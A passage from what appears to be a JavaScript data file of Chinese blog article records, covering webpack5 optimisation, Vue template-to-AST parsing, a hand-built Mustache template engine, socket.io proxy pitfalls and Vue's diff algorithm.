        '# webpack5搭建vuecli\n话不多说，先上最终打包结果对比图：\n> 原本使用vue脚手架写的项目，在没做优化的情况下，最终的打包结果：\n\n![vuecli包大小.png](https://img.cdn.hsslive.cn/1621177577901vuecli包大小.png)\n\n> 段落引用使用webpack5自己手动搭建的vue脚手架，且做了代码优化后的最终打包结果：\n\n![hss_webpack5包大小.png](https://img.cdn.hsslive.cn/1621177719527hss_webpack5包大小.png)\n# 做了什么优化?\n1. 使用compression-webpack-plugin进行http压缩\n2. 使用@vue/preload-webpack-plugin进行预获取/预加载\n3. 使用terser-webpack-plugin进行压缩、转化/混淆\n4. 使用webpack.optimize.ModuleConcatenationPlugin()进行作用域提升\n5. ~~使用purgecss-webpack-plugin进行css TreeShaking~~，有bug暂时不做优化\n6. optimization中配置usedExports为true，来帮助Terser进行优化；package.json中配置sideEffects，直接对模块进行优化；\n7. 使用cdn进行加载需要用到的第三方库\n',
      click: 136,
      createdAt: '2021-05-16T15:41:14.000Z',
      updatedAt: '2021-05-16T15:41:14.000Z',
      types: [
        {
          id: 1,
          name: '前端',
          createdAt: '2020-12-30T14:06:49.000Z',
          updatedAt: '2020-12-30T14:06:51.000Z',
          article_type: {
            id: 81,
            article_id: 81,
            type_id: 1,
            createdAt: '2021-05-16T15:41:14.000Z',
            updatedAt: '2021-05-16T15:41:14.000Z',
          },
        },
      ],
      stars: [],
      users: [
        {
          id: 1,
          username: 'hss',
          status: 1,
          avatar: 'https://img.cdn.hsslive.cn/1613141138717Billd.jpg',
          title: 'hello world',
          createdAt: '2020-10-10T15:24:44.000Z',
          updatedAt: '2021-11-28T12:14:36.000Z',
          user_article: {
            id: 81,
            user_id: 1,
            article_id: 81,
            createdAt: '2021-05-16T15:41:14.000Z',
            updatedAt: '2021-05-16T15:41:14.000Z',
          },
        },
      ],
      comments: [
        {
          id: 30,
          article_id: 81,
          from_user_id: 12,
          to_comment_id: -1,
          to_user_id: -1,
          content:
            'github地址：https://github.com/galaxy-s10/hss-webpack5，如果对你有用的话，点个star吧~',
          createdAt: '2021-05-16T16:32:02.000Z',
          updatedAt: '2021-05-16T16:32:02.000Z',
        },
      ],
      tags: [
        {
          id: 6,
          name: 'webpack',
          color: 'rgba(142, 214, 251, 1)',
          createdAt: '2020-07-04T15:20:26.000Z',
          updatedAt: '2020-07-04T15:20:26.000Z',
        },
        {
          id: 5,
          name: 'vue',
          color: 'rgba(65, 184, 131, 1)',
          createdAt: '2020-07-04T15:19:33.000Z',
          updatedAt: '2020-07-04T15:19:33.000Z',
        },
        {
          id: 12,
          name: 'vue-router',
          color: 'rgba(131, 109, 184, 1)',
          createdAt: '2020-07-04T16:03:11.000Z',
          updatedAt: '2020-07-04T16:03:11.000Z',
        },
        {
          id: 13,
          name: 'vuex',
          color: 'rgba(23, 113, 115, 1)',
          createdAt: '2020-07-05T05:46:07.000Z',
          updatedAt: '2020-07-05T05:46:07.000Z',
        },
      ],
    },
    {
      id: 80,
      title: '520提桶日记',
      is_comment: 1,
      status: 1,
      img: '/1619274384805520离职封面图.jpg',
      content:
        "# 感慨\r\r一眨眼，在公司差不多干了半年啦，因为我部门就我一个人，所以，期间的艰辛不足为外人道也，好在都坚持下来了哈哈哈。\r\r半年里，学到了很多东西，有公司项目上学到的，也有利用空余时间自己学习的；虽然时间不长，但令我成长了许多，除了学到了技术，还体会到了社会的残酷和人与人之间的套路，学会了忍耐和理解，还有就是保持学习，不能当小垃圾！\r\r# 2021-05-20\r\r> don't forget\r\r# ![](https://img.cdn.hsslive.cn/1619271922620520离职.jpg)\r",
      click: 161,
      createdAt: '2021-04-24T14:26:28.000Z',
      updatedAt: '2021-04-26T00:46:58.000Z',
      types: [
        {
          id: 3,
          name: '随记',
          createdAt: '2020-12-30T14:06:49.000Z',
          updatedAt: '2020-12-30T14:06:51.000Z',
          article_type: {
            id: 80,
            article_id: 80,
            type_id: 3,
            createdAt: '2021-04-24T14:26:28.000Z',
            updatedAt: '2021-04-24T14:26:28.000Z',
          },
        },
      ],
      stars: [],
      users: [
        {
          id: 1,
          username: 'hss',
          status: 1,
          avatar: 'https://img.cdn.hsslive.cn/1613141138717Billd.jpg',
          title: 'hello world',
          createdAt: '2020-10-10T15:24:44.000Z',
          updatedAt: '2021-11-28T12:14:36.000Z',
          user_article: {
            id: 80,
            user_id: 1,
            article_id: 80,
            createdAt: '2021-04-24T14:26:28.000Z',
            updatedAt: '2021-04-24T14:26:28.000Z',
          },
        },
      ],
      comments: [
        {
          id: 29,
          article_id: 80,
          from_user_id: 31,
          to_comment_id: -1,
          to_user_id: -1,
          content: '祝前程似锦！！',
          createdAt: '2021-04-24T14:45:04.000Z',
          updatedAt: '2021-04-24T14:45:04.000Z',
        },
      ],
      tags: [
        {
          id: 26,
          name: '生活琐事',
          color: '#44d62c',
          createdAt: '2021-04-18T11:02:30.000Z',
          updatedAt: '2021-04-18T11:02:30.000Z',
        },
      ],
    },
    {
      id: 79,
      title: 'vue核心之AST',
      is_comment: 1,
      status: 1,
      img: '/1618744294071向日葵.jpg',
      content:
        '# 什么是AST\n\n> AST是指抽象语法树（abstract syntax tree缩写即AST）\n\n# 模板转化为AST（简易版）\n\n## index.html\n\n```html\n<!DOCTYPE html>\n<html lang="en">\n\n<head>\n    <meta charset="UTF-8">\n    <meta http-equiv="X-UA-Compatible" content="IE=edge">\n    <meta name="viewport" content="width=device-width, initial-scale=1.0">\n    <title>Document</title>\n</head>\n\n<body>\n    <script type="text/template" id="ast">\n        <div>\n            <h1>你好</h1>\n            <ul>\n                <li>你好啊A</li>\n                <li>好的B</li>\n                <li>收到了C</li>\n            </ul>\n        </div>\n    </script>\n    <script src="./parse.js"></script>\n    <script>\n        var str = document.getElementById(\'ast\').innerHTML\n        console.log(str)\n        parse(str)\n    </script>\n</body>\n\n</html>\n```\n\n## parse.js\n\n```js\nfunction parse(templateStr) {\n    // 当前遍历到的位置\n    var index = 0\n    // 栈1保存标签\n    var stack1 = []\n    // 栈2保存结果\n    var stack2 = [{ children: [] }]\n    // 剩余的模板字符串（即没遍历到的）\n    var lastStr = templateStr\n    // 匹配开始标签(注意这里的正则最后不要加全局的g,否则会出现问题)\n    var startTagReg = /^<([a-z]+[1-6]?)>/\n    // 匹配结束标签(注意这里的正则最后不要加全局的g,否则会出现问题)\n    var endTagReg = /^</([a-z]+[1-6]?)>/\n    // 这里只匹配开始标签到结束标签之间的文字，不匹配结束标签到开始标签之间的文字\n    var wordTagReg = /^([^\\>]+)</([a-z]+[1-6]?)>/\n    // var wordTagReg = /^>([^\\>]+)</([a-z]+[1-6]?)>/\n\n    while (index < templateStr.length) {\n        if (startTagReg.test(lastStr)) {\n            var startTag = lastStr.match(startTagReg)[1]\n            console.log(\'找到开始标签\', startTag)\n            // console.log(index)\n            index += startTag.length + 2\n            stack1.push({ tag: startTag, children: [], isRoot: true })\n            stack2.push({ tag: startTag, children: [] })\n        } else if (endTagReg.test(lastStr)) {\n            var endTag = lastStr.match(endTagReg)[1]\n            console.log(\'找到结束标签\', endTag)\n            var c = stack2.pop()\n            stack2[stack2.length - 1].children.push(c)\n            index += endTag.length + 3\n        } else if (wordTagReg.test(lastStr)) {\n            var wordTag = lastStr.match(wordTagReg)[1]\n            index += wordTag.length\n            if (!/^\\s+$/.test(wordTag)) {\n                stack2[stack2.length - 1].children.push({ text: wordTag })\n            } else {\n                // console.log(\'全是空字符串\')\n            }\n        } else {\n            // 啥都没找到\n            console.log(\'没匹配到标签以及开始到结束标签之间的文字\', lastStr)\n            index++\n        }\n        lastStr = templateStr.substring(index)\n    }\n    console.log(stack1)\n    console.log(stack2)\n}\n```\n\n# 待更新',
      click: 113,
      createdAt: '2021-04-18T11:11:34.000Z',
      updatedAt: '2021-04-18T11:11:34.000Z',
      types: [
        {
          id: 1,
          name: '前端',
          createdAt: '2020-12-30T14:06:49.000Z',
          updatedAt: '2020-12-30T14:06:51.000Z',
          article_type: {
            id: 79,
            article_id: 79,
            type_id: 1,
            createdAt: '2021-04-18T11:11:34.000Z',
            updatedAt: '2021-04-18T11:11:34.000Z',
          },
        },
      ],
      stars: [],
      users: [
        {
          id: 1,
          username: 'hss',
          status: 1,
          avatar: 'https://img.cdn.hsslive.cn/1613141138717Billd.jpg',
          title: 'hello world',
          createdAt: '2020-10-10T15:24:44.000Z',
          updatedAt: '2021-11-28T12:14:36.000Z',
          user_article: {
            id: 79,
            user_id: 1,
            article_id: 79,
            createdAt: '2021-04-18T11:11:34.000Z',
            updatedAt: '2021-04-18T11:11:34.000Z',
          },
        },
      ],
      comments: [],
      tags: [
        {
          id: 5,
          name: 'vue',
          color: 'rgba(65, 184, 131, 1)',
          createdAt: '2020-07-04T15:19:33.000Z',
          updatedAt: '2020-07-04T15:19:33.000Z',
        },
        {
          id: 25,
          name: 'vue2源码',
          color: '#49c48d',
          createdAt: '2021-04-04T12:55:57.000Z',
          updatedAt: '2021-04-04T12:55:57.000Z',
        },
      ],
    },
    {
      id: 78,
      title: '前端模板引擎',
      is_comment: 1,
      status: 1,
      img: '/1617544782384mustachejs.png',
      content:
        "# 直接创建dom\n\n```html\n<body>\n    <ul id=\"app\"></ul>\n    <script>\n        var arr = [\n            { name: 'tom', age: 15 },\n            { name: 'lilei', age: 16 },\n            { name: 'why', age: 18 },\n        ]\n        var ele = document.getElementById('app')\n        for (let i = 0; i < arr.length; i++) {\n            var li = document.createElement('li');\n            li.innerText = \"大家好，我叫：\" + arr[i].name + \"，今年：\" + arr[i].age + \"岁\"\n            ele.appendChild(li)\n        }\n    </script>\n</body>\n```\n\n# 数组join方法\n\n```html\n<body>\n    <ul id=\"app\">\n    </ul>\n    <script>\n        var arr = [\n            { name: 'tom', age: 15 },\n            { name: 'lilei', age: 16 },\n            { name: 'why', age: 18 },\n        ]\n        var ele = document.getElementById('app')\n        for (let i = 0; i < arr.length; i++) {\n            ele.innerHTML += [\n                \"<li>\",\n                \"大家好，我叫：\" + arr[i].name + \"，今年：\" + arr[i].age + \"岁\",\n                \"</li>\"\n            ].join('')\n        }\n    </script>\n</body>\n```\n\n# es6模板字符串方法\n\n```html\n<body>\n    <ul id=\"app\">\n    </ul>\n    <script type=\"text/jsss\">\n        <li>大家好，我叫：，今年：岁</li>\n    </script>\n    <script>\n        var arr = [\n            { name: 'tom', age: 15 },\n            { name: 'lilei', age: 16 },\n            { name: 'why', age: 18 },\n        ]\n\n        var ele = document.getElementById('app')\n        for (let i = 0; i < arr.length; i++) {\n            ele.innerHTML += `\n            <li>\n                大家好，我叫：${arr[i].name}，今年：${arr[i].age}岁\n            </li>\n            `\n        }\n    </script>\n</body>\n```\n\n# 将dom转成字符串\n\nscript标签内的type不是text/javascript，就不会当做js代码执行，这时候script就是一个普通的节点，但它又不会像html标签那些显示在页面上！\n\n```html\n<body>\n    <script type=\"text/template\" id=\"myTemplate\">\n        <ul>\n            <li>苹果</li>\n            <li>香蕉</li>\n            <li>梨子</li>\n        </ul>\n    </script>\n\n    <script>\n        var str = document.getElementById('myTemplate').innerHTML\n        console.log(str)\n    </script>\n</body>\n```\n\n# mustache\n\nhttps://github.com/janl/mustache.js\n\n## 实现mustache\n\n### mustache.js\n\n```js\nvar Mustache = {\n    render: function (templateStr, data) {\n        var nestedTokens = tokensToNestedTokens(parseTokens(templateStr))\n        return tokensRenderDomStr(nestedTokens, data)\n    }\n}\n// 扫描模板字符串\nclass Scanner {\n    constructor(templateStr) {\n        this.templateStr = templateStr\n        this.pos = 0    //当前指针\n        this.lastStr = templateStr //剩余未扫描的模板字符串\n    }\n    // 扫描到标记\n    Scan(tag) {\n        // 边界处理（只有当扫描到标记的时候才将指针往后移）\n        if (this.lastStr.indexOf(tag) == 0) {\n            this.pos += tag.length\n            this.lastStr = this.templateStr.substring(this.pos)\n        }\n\n    }\n    // 扫描到哪里标记前一个\n    ScanUntil(tag) {\n        var _pos = this.pos\n        // 当没扫到tag的时候\n        while (this.lastStr.indexOf(tag) != 0 && this.pos < this.templateStr.length) {\n            this.pos++\n            // str.substr(start[, length])可能废弃，不推荐。\n            // this.lastStr = this.templateStr.substr(this.pos)\n            this.lastStr = this.templateStr.substring(this.pos)\n        }\n        return this.templateStr.substring(_pos, this.pos)\n    }\n}\n\n// 将扫描到的字符串转成数组\nfunction parseTokens(templateStr) {\n    var tokens = []\n    var scanner = new Scanner(templateStr)\n    // 当指针没有到走到模板字符串的最后一个字符时\n    while (scanner.pos != templateStr.length) {\n        var scan_text = scanner.ScanUntil('{{')\n        tokens.push(['text', scan_text.trim()])\n        // tokens.push(['text', scan_text])\n        scanner.Scan('{{')\n        var scan_text2 = scanner.ScanUntil('}}')\n        if (scan_text2 != \"\") {\n            if (scan_text2[0] == \"#\") {\n                tokens.push(['#', scan_text2.substring(1)])\n            } else if (scan_text2[0] == \"/\") {\n                tokens.push(['/', scan_text2.substring(1)])\n            } else {\n                tokens.push(['name', scan_text2])\n            }\n\n        }\n        scanner.Scan('}}')\n    }\n    return tokens\n\n}\n\n\n// 将数组转成嵌套数组\nfunction tokensToNestedTokens(tokens) {\n    // 最后整理好后返回的嵌套数组\n    var nestedTokens = []\n    // 中转数组（一开始指向最后返回的嵌套数组）\n    var tempNestedTokens = nestedTokens\n    // 使用栈结构保存当前正在嵌套的数组\n    var stackList = []\n\n    for (let i = 0; i < tokens.length; i++) {\n        switch (tokens[i][0]) {\n            case \"#\":\n                // 先将当前的#项存到中转数组\n                tempNestedTokens.push(tokens[i])\n                // 改变中转数组的引用，使中转数组指向当前#项\n                tempNestedTokens = tokens[i][2] = []\n                // 入栈（将当前#项压入栈）\n                stackList.push(tokens[i])\n                break;\n            case \"/\":\n                // 出栈（将当前栈的最后一个#项弹出）\n                stackList.pop()\n                // 出栈后，改变中转数组的引用，使中转数组指向当前栈顶的#项\n                tempNestedTokens = stackList.length > 0 ? stackList[stackList.length - 1][2] : nestedTokens\n                break;\n            default:\n                /**\n                 * 在中转数组插入#项\n                 * 这里很妙，因为中转数组默认是指向返回的嵌套数组nestedTokens，\n                 * 但，如果遇到#，先往中转数组插入#（如果是首次遇到#，往中转数组插入#就等\n                 * 于往nestedTokens插入#），然后将中转数组（如果是首次修改中转数组的引用，\n                 * 等同于修改nestedTokens的引用）的指向改为当前的#项，\n                 * 而且，改变中转数组的指向并不会修改原本的nestedTokens数组，然后将#入栈。\n                 * 因此，这个中转数组的指向会根据#而改变，而且这个中转数组始终指向当\n                 * 前遇到的#，即没有遇到#又没遇到/时，这里就会往中转数组（当前指向的#项\n                 * ）插入。\n                 */\n                tempNestedTokens.push(tokens[i])\n        }\n    }\n    return nestedTokens\n}\n\n// 将数据添加到整理好的嵌套数组\nfunction tokensRenderDomStr(nestedTokens, data) {\n    var domStr = \"\"\n    for (let i = 0; i < nestedTokens.length; i++) {\n        if (nestedTokens[i][0] == 'text') {\n            domStr += nestedTokens[i][1]\n        } else if (nestedTokens[i][0] == 'name') {\n            if (String(nestedTokens[i][1]) == '.') {\n                domStr += formatObject(data, nestedTokens[i][1])\n            } else if (String(nestedTokens[i][1]).split('.').length > 1) {\n                domStr += formatObject(data, nestedTokens[i][1])\n            } else {\n                domStr += data[nestedTokens[i][1]]\n            }\n\n        } else if (nestedTokens[i][0] == '#') {\n            var tempStr = \"\"\n            for (let j = 0; j < data[nestedTokens[i][1]].length; j++) {\n                tempStr += tokensRenderDomStr(nestedTokens[i][2], data[nestedTokens[i][1]][j])\n            }\n            domStr += tempStr\n        }\n    }\n    return domStr\n}\n\n// 将数组转成嵌套数组（复杂写法，难实现，不用这个）\nfunction tokensToNestedTokens1(tokens) {\n    // 深拷贝原数组\n    var deepTokens = JSON.parse(JSON.stringify(tokens))\n    // 最后整理好后返回的嵌套数组\n    var nestedTokens = []\n    // 当前收集到的数组\n    var tempNestedTokens = nestedTokens\n    // 使用栈结构保存当前正在嵌套的数组\n    var stackList = []\n\n    for (let i = 0; i < tokens.length; i++) {\n        switch (tokens[i][0]) {\n            case \"#\":\n                tokens[i][2] = []\n                if (stackList.length) {\n                    stackList[stackList.length - 1][2].push(tokens[i])\n                    // 入栈\n                    // stackList.push(stackList[stackList.length - 1])\n                } else {\n                    nestedTokens.push(tokens[i])\n                    // 入栈\n                    stackList.push(nestedTokens[nestedTokens.length - 1])\n                }\n\n                break;\n            case \"/\":\n                // 出栈\n                var pop = stackList.pop()\n                break;\n            default:\n                if (stackList.length) {\n                    stackList[stackList.length - 1][2].push(tokens[i])\n                } else {\n                    nestedTokens.push(tokens[i])\n                }\n        }\n    }\n    return nestedTokens\n}\n\n// 将var info = {name:'tom',hobby:{game:'timi'}}通过info.hobby.game获取timi\nfunction formatObject(obj, str) {\n    // 如果只有\".\"，则直接返回obj\n    if (str == '.') {\n        return obj\n    }\n    var arr = String(str).split('.')\n    for (let i = 0; i < arr.length; i++) {\n        obj = obj[arr[i]]\n    }\n    return obj\n}\n// export default Mustance\n```\n\n### index.html\n\n```html\n<body>\n    <div id=\"app\"></div>\n    <script type=\"text/template\" id=\"myTemplate\">\n        <div>\n            今天是：{{date}}，天气：{{weather}}\n        </div>\n        <ul>\n            {{#firend}}\n                <li class='123'>\n                我的朋友{{firend_name}}，今年{{age}}岁了，喜欢\n                {{#hobby}}\n                    <span>{{.}}</span>\n                {{/hobby}}\n                </li>\n            {{/firend}}\n            {{#pets}}\n                <li class='123'>\n                我的宠物{{name}}，今年{{age}}岁了\n                </li>\n            {{/pets}}\n        </ul>\n    </script>\n\n    <script src=\"./mustache.js\"></script>\n    <script>\n        var str = document.getElementById('myTemplate').innerHTML\n        var data = {\n            date: '2021年4月4日',\n            firend: [\n                { firend_name: \"tom\", age: 18, hobby: [\"看书\", \"画画\", \"跳舞\"] },\n                { firend_name: \"why\", age: 19, hobby: [\"唱歌\", \"弹琴\"] },\n                { firend_name: \"lili\", age: 21, hobby: [\"编程\", \"游戏\"] },\n            ],\n            pets: [\n                { name: 'dog', age: 3 },\n                { name: 'cat', age: 2 },\n            ],\n            weather: '晴'\n        };\n        var domStr = Mustache.render(str, data);\n        var ele = document.getElementById(\"app\");\n        ele.innerHTML = domStr;\n    </script>\n</body>\n```\n\n# 总结\n\n上面实现板引擎都是根据js创建生成dom，因此右键查看源代码其实只有一个根元素，其余元素都是js生成的。\n\n参考：\n\nhttps://www.bilibili.com/video/BV1EV411h79m?from=search&seid=17554359241912588981",
      click: 90,
      createdAt: '2021-04-04T13:59:45.000Z',
      updatedAt: '2021-04-04T13:59:45.000Z',
      types: [
        {
          id: 1,
          name: '前端',
          createdAt: '2020-12-30T14:06:49.000Z',
          updatedAt: '2020-12-30T14:06:51.000Z',
          article_type: {
            id: 78,
            article_id: 78,
            type_id: 1,
            createdAt: '2021-04-04T13:59:45.000Z',
            updatedAt: '2021-04-04T13:59:45.000Z',
          },
        },
      ],
      stars: [],
      users: [
        {
          id: 1,
          username: 'hss',
          status: 1,
          avatar: 'https://img.cdn.hsslive.cn/1613141138717Billd.jpg',
          title: 'hello world',
          createdAt: '2020-10-10T15:24:44.000Z',
          updatedAt: '2021-11-28T12:14:36.000Z',
          user_article: {
            id: 78,
            user_id: 1,
            article_id: 78,
            createdAt: '2021-04-04T13:59:45.000Z',
            updatedAt: '2021-04-04T13:59:45.000Z',
          },
        },
      ],
      comments: [],
      tags: [
        {
          id: 1,
          name: 'JavaScript',
          color: '#3b6b55',
          createdAt: '2020-12-23T16:00:00.000Z',
          updatedAt: '2021-01-01T20:17:10.000Z',
        },
        {
          id: 25,
          name: 'vue2源码',
          color: '#49c48d',
          createdAt: '2021-04-04T12:55:57.000Z',
          updatedAt: '2021-04-04T12:55:57.000Z',
        },
      ],
    },
    {
      id: 77,
      title: 'websocket踩坑记',
      is_comment: 1,
      status: 1,
      img: null,
      content:
        "# socket.io\n\n如果用了socket.io\n\n## client\n\n### 小程序端\n\n小程序端使用：weapp.socket.io\n\nweapp.socket.io官方github标明：\n\n> Full feature socket.io style implemented, based-on `socket.io@2.x` version\n\n这句话的意思是：weapp.socket.io是基于socket.io2.x版本的。\n\n现在最新的socket.io是4.0版本的，但是socket.io每个版本实现的websocket不一样，因此，前后端使用的socket.io需要版本对应！即只要你小程序用了weapp.socket.io，后端就要用对应的2.x版本，或者用4.0的版本，4.0版本有一个allowEIO3属性，这个属性代表是否启用Socket兼容性，兼容v2的客户端，但是这个属性默认是false（简直反人类，明知道有兼容性问题，还默认把它关了...），即如果后端用了4.0的socket.io，而客户端用2.x版本的socket.io连接，会存在兼容性问题问题，比如客户端请求后端服务器socket.io，请求成功了，但是连接后端服务器失败！所以，使用socket.io这个库时，需要前后端协调好！\n\n服务端：\n\n```js\nconst express = require('express');\nconst app = express();\nconst port = 5001\nconst socketIoPort = 5002\n\nconst io = require(\"socket.io\")(socketIoPort, {\n    allowEIO3: true,\t// 兼容v2版本的socket.io客户端，兼容小程序weapp.socket.io(基于socket.io2.x)\n});\n\nio.on('connection', function (socket) {\n    console.log(`连上了${socket.nsp.name}`);\n    io.emit(`连上了${socket.nsp.name}`);\n});\n\napp.listen(port, () => {\n    console.log(`开始监听${port}端口`);\n});\n```\n\n如果后端使用了socket.io，小程序端就最好（一定要）使用socket.io，不要用小程序原生的`wx.connectSocket` 这些方法了！\n\n### 浏览器端\n\n和后端配合好就好，这里写个细节吧：\n\n客户端：\n\n```js\nconst socket = io('ws://www.zhengbeining.com/hello', {\n  transports: [\"websocket\"]\n})\n```\n\n上面写了ws://www.zhengbeining.com/hello，但是socket.io实际发请求是：ws://www.zhengbeining.com，并不会带上hello，那这个hello哪去了？实际上这个hello会被socket.io认为是命名空间（namespace）,除了匹配/，还会匹配到服务端的对应的命令空间：\n\n```js\nconst express = require('express');\nconst app = express();\nconst port = 5001\nconst socketIoPort = 5002\n\nconst io = require(\"socket.io\")(socketIoPort, {\n    path: '/',\n    allowEIO3: true,\n});\n\nio.on('connection', function (socket) {\n    console.log(`连上了${socket.nsp.name}`);\n    io.emit(`连上了${socket.nsp.name}`);\n});\nio.of('hello').on(\"connection\", (socket) => {\n    const newNamespace = socket.nsp;\n    console.log(`连上了${socket.nsp.name}`);\n    newNamespace.emit(\"hello\");\n});\n\n\napp.listen(port, () => {\n    console.log(`开始监听${port}端口`);\n});\n```\n\n结果会打印连上了/和连上了/hello\n\n## serve\n\n同上。问题主要是前后端协调以及看准文档！\n\n## 代理问题\n\n假设服务端架设在代理服务端的80端口，即http，且服务端是这样的：\n\n```js\nconst express = require('express');\nconst app = express();\nconst port = 5001\nconst socketIoPort = 5002\n\nconst io = require(\"socket.io\")(socketIoPort, {\n    allowEIO3: true,\n});\n\nio.on('connection', function (socket) {\n    console.log(`连上了${socket.nsp.name}`);\n    io.emit(`连上了${socket.nsp.name}`);\n});\n\napp.listen(port, () => {\n    console.log(`开始监听${port}端口`);\n});\n```\n\n也就是说5002是后端的websocket服务，客户端需要代理到后端的5002端口，此时客户端这样写：\n\n```js\nconst socket = io('ws://www.zhengbeining.com', {\n  transports: [\"websocket\"]\n})\n```\n\n此时打开控制台查看请求链接，发现发请求的并不是ws://www.zhengbeining.com，而是：ws://www.zhengbeining.com/socket.io/?EIO=3&transport=websocket，路径上的?后面的参数并没有影响（浏览器会解析出uri）但是ws://www.zhengbeining.com和ws://www.zhengbeining.com/socket.io就不一样了，这两个代理到的地方都不一样，这是因为socket.io这个插件库在connect时，path路径默认是socket.io（客户端连接时会带上这个值，服务端匹配时也会带上这个值），且会拼接在地址栏上，因此在配置代理的时候，不能将/匹配到5002端口，要用/socket.io匹配到/5002端口：\n\n```nginx\nlocation /socket.io {\n    proxy_pass http://127.0.0.1:5002;\n    proxy_http_version 1.1;\n    proxy_set_header Upgrade $http_upgrade;\n    proxy_set_header Connection \"Upgrade\";\n}\n```\n\n如果我非想要在连接的时候不要在路径后面拼接这个/socket.io呢，这样也可以，但是改动有点大，需要客户端和服务端都将path改成/，然后代理服务器就匹配/代理到5002即可：\n\n客户端：\n\n```js\nconst socket = io('ws://www.zhengbeining.com', {\n  path:'/',\n  transports: [\"websocket\"]\n})\n```\n\n服务端：\n\n```js\nconst io = require(\"socket.io\")(socketIoPort, {\n    path:'/',\n    allowEIO3: true,\n});\n```\n\n代理服务器nginx:\n\n```nginx\nlocation / {\n    proxy_pass http://127.0.0.1:5002;\n    proxy_http_version 1.1;\n    proxy_set_header Upgrade $http_upgrade;\n    proxy_set_header Connection \"Upgrade\";\n}\n```\n\n\n\n# nodejs-websocket\n\n和原生websocket类似，后端如果用nodejs-websocket，则客户端可以使用原生websocket，小程序也可使用小程序原生的`wx.connectSocket`\n\n# ws和wss\n\n默认是ws（因为网站默认是80端口，http）。\n\n如果websocket在代理服务器的80端口，即http，则使用ws；\n\n如果websocket在代理服务器的443端口，即https，则使用wss；\n\n当然了这只是大部分的默认情况，你喜欢的话也可以把其他端口改成https，不用443端口当https也是可以的，别杠~",
      click: 133,
      createdAt: '2021-03-31T11:37:13.000Z',
      updatedAt: '2021-03-31T11:37:13.000Z',
      types: [
        {
          id: 3,
          name: '随记',
          createdAt: '2020-12-30T14:06:49.000Z',
          updatedAt: '2020-12-30T14:06:51.000Z',
          article_type: {
            id: 77,
            article_id: 77,
            type_id: 3,
            createdAt: '2021-03-31T11:37:14.000Z',
            updatedAt: '2021-03-31T11:37:14.000Z',
          },
        },
      ],
      stars: [],
      users: [
        {
          id: 1,
          username: 'hss',
          status: 1,
          avatar: 'https://img.cdn.hsslive.cn/1613141138717Billd.jpg',
          title: 'hello world',
          createdAt: '2020-10-10T15:24:44.000Z',
          updatedAt: '2021-11-28T12:14:36.000Z',
          user_article: {
            id: 77,
            user_id: 1,
            article_id: 77,
            createdAt: '2021-03-31T11:37:14.000Z',
            updatedAt: '2021-03-31T11:37:14.000Z',
          },
        },
      ],
      comments: [],
      tags: [
        {
          id: 1,
          name: 'JavaScript',
          color: '#3b6b55',
          createdAt: '2020-12-23T16:00:00.000Z',
          updatedAt: '2021-01-01T20:17:10.000Z',
        },
        {
          id: 2,
          name: 'Node',
          color: '#089910',
          createdAt: '2020-07-03T12:55:09.000Z',
          updatedAt: '2020-07-04T15:19:33.000Z',
        },
      ],
    },
    {
      id: 76,
      title: 'vue核心之diff',
      is_comment: 1,
      status: 1,
      img: '/1616726492362vue之diff.jpg',
      content:
        "# vue的diff算法\n\n`Vue`和`React`在更新`dom`时，使用的算法相同，都是基于[snabbdom](https://github.com/snabbdom/snabbdom)。snabbdom翻译为：速度。\n\n## 为什么使用diff\n\n真实dom的开销是很大的，这个跟性能优化中的重绘意义类似。某些时候我们修改了页面中的某个数据，如果直接渲染到真实DOM中会引起整棵树的重绘，那么我们能不能只让我们改变过的数据映射到真实 DOM,做一个最少的重绘呢，这就是diff算法要解决的事情。\n\n## 先序深度优先\n\n新旧节点（新旧节点都是指虚拟dom对象）的比较采用先序深度优先遍历。\n\n![diff1.jpg](https://img.cdn.hsslive.cn/1616726474657diff1.jpg)\n\n\n\n## 同层比较\n\n同层比较Diff算法中，新旧节点（新旧节点都是指虚拟dom对象）的比较是同层级的比较，不会跨层比较。比如下图出现的 四次比较（从 first 到 fouth），他们的共同特点都是有**相同的父节点。**比如蓝色部分的比较，新旧子节点的父节点是相同节点 1。比如红色部分的比较，新旧子节点的父节点都是 2\n\n![diff2.jpg](https://img.cdn.hsslive.cn/1616726483857diff2.jpg)\n\n比较逻辑：\n\n1. 两个节点相同，但不在相同层级上，无法复用\n2. 两个节点相同，在同一层级，但父节点不同，无法复用\n3. **两个节点相同，在同一层级，且父节点相同，可以复用**\n\n# 虚拟dom\n\n虚拟 `DOM`：用 `JavaScript` 对象描述 `DOM` 的层次结构。`DOM` 中的一切属性都在虚拟 `DOM` 中有对应的属性。\n\nvirtual DOM和真实DOM的区别\n\n> virtual DOM是将真实的 DOM 的数据抽取出来，以对象的形式模拟树形结构，diff算法比较的也是virtual DOM\n\ndom结构\n\n```html\n<ul>\n    <li>牛奶</li>\n    <li>咖啡</li>\n</ul>\n```\n\njs对象\n\n```js\n{\n    \"sel\":\"ul\",\n    \"data\":{},\n    \"children\":[\n        {\n            \"sel\":\"li\",\n            \"data\":{\n\n            },\n            \"text\":\"牛奶\"\n        },\n        {\n            \"sel\":\"li\",\n            \"data\":{},\n            \"text\":\"咖啡\"\n        }\n    ]\n}\n```\n\n## 创建虚拟dom对象\n\n```js\n/**\n * vnode函数返回一个虚拟dom节点:\n * sel:选择器\n * data:数据\n * children:子虚拟dom\n * text:文本\n * elm:真实dom对象\n */\nfunction vnode(sel, data, children, text, elm) {\n    return { sel, data, children, text, elm }\n}\n\n\n/**\n * h函数创建虚拟dom对象\n * 目前只支持这三种格式的h函数：\n * 第一种：h('div', {}, '文字')\n * 第二种：h('div', {}, [])，注意，这里的第三个参数[]，里面必须h函数返回的虚拟dom对象。\n * 第三种：h('div', {}, h())\n */\n\nfunction h(sel, data, c) {\n    // 检查参数的个数\n    if (arguments.length !== 3)\n        throw new Error('h函数必须传入3个参数')\n    // 检查参数 c 的类型\n    if (typeof c === 'string' || typeof c === 'number') {\n        // 说明现在调用h函数的是第一种格式\n        return vnode(sel, data, undefined, c, undefined)\n    } else if (Array.isArray(c)) {\n        // 说明现在调用h函数的是第二种格式\n        var children = []\n        for (var i = 0; i < c.length; i++) {\n            // 检查 c[i] 必须是个虚拟dom对象\n            if (!(typeof c[i] === 'object' && c[i].hasOwnProperty('sel')))\n                throw new Error('传入的数组参数中存在非虚拟dom对象')\n            children.push(c[i])\n        }\n        return vnode(sel, data, children, undefined, undefined)\n    } else if (typeof c === 'object' && c.hasOwnProperty('sel')) {\n        // 说明现在调用h函数的是第三种格式\n        var children = [c]\n        return vnode(sel, data, children, undefined, undefined)\n    } else {\n        throw new Error('传入的第三个参数类型不对')\n    }\n}\n\n```\n\n```js\n// 